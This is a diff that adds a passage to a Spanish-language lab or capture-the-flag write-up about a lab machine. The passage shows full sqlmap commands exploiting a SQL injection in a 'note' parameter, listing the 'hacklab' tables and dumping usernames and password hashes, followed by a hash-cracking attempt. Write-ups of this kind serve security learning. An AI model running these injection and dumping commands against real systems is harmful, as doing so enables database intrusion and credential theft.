@@ -168,6 +168,83 @@ available databases [2]:
   </code>
 </pre>
 
+Bien vemos 2 bases de datos hacklab y information_schema vamos a listarnos las tablas de la DB hacklab
 
+<pre>
+  <code>
+    
+    ❯ sqlmap -u "http://10.88.0.2/app.php" --data="note=" -p note --cookie="PHPSESSID=g32ujngur7l9uh62fb37id280u" -D hacklab --tables --batch --keep-alive
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.8.12#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:44:41 /2026-01-25/
+
+[14:44:41] [WARNING] provided value for parameter 'note' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[14:44:41] [INFO] resuming back-end DBMS 'mysql' 
+[14:44:41] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+
+[14:44:41] [INFO] retrieved: 'notes'
+[14:44:41] [INFO] retrieved: 'users'
+Database: hacklab
+[2 tables]
++-------+
+| notes |
+| users |
++-------+
+
+[14:44:41] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.88.0.2'
+[14:44:41] [WARNING] your sqlmap version is outdated
+
+  </code>
+</pre>
+
+Bien vemos 2 tablas vamos a listarnos ambas y filtraremos ya por sus columnas para poder conseguir credenciales.
+
+<pre>
+  <code>
+    ❯ sqlmap -u "http://10.88.0.2/app.php" --data="note=" -p note --cookie="PHPSESSID=g32ujngur7l9uh62fb37id280u" -D hacklab -T notes,users -C id,password,username --dump --batch --keep-alive
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.8.12#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:48:07 /2026-01-25/
+
+[14:48:08] [WARNING] provided value for parameter 'note' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+
+[14:48:09] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[14:48:09] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[14:48:09] [INFO] starting 4 processes 
+[14:48:16] [WARNING] no clear password(s) found                                            
+Database: hacklab
+Table: users
+[3 entries]
++----+----------------------------------+----------+
+| id | password                         | username |
++----+----------------------------------+----------+
+| 1  | 5111fdc7a916715e63197bbab20feb35 | admin    |
+| 2  | 72021aa9726470898cc9636076e5e061 | dddd     |
+| 3  | wWZ *vgx Rz3j MBQ ZN             | ttttt    |
++----+----------------------------------+----------+
+
+[14:48:16] [INFO] table 'hacklab.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.88.0.2/dump/hacklab/users.csv'
+[14:48:16] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.88.0.2'
+[14:48:16] [WARNING] your sqlmap version is outdated
+
+
+  </code>
+</pre>
 
 
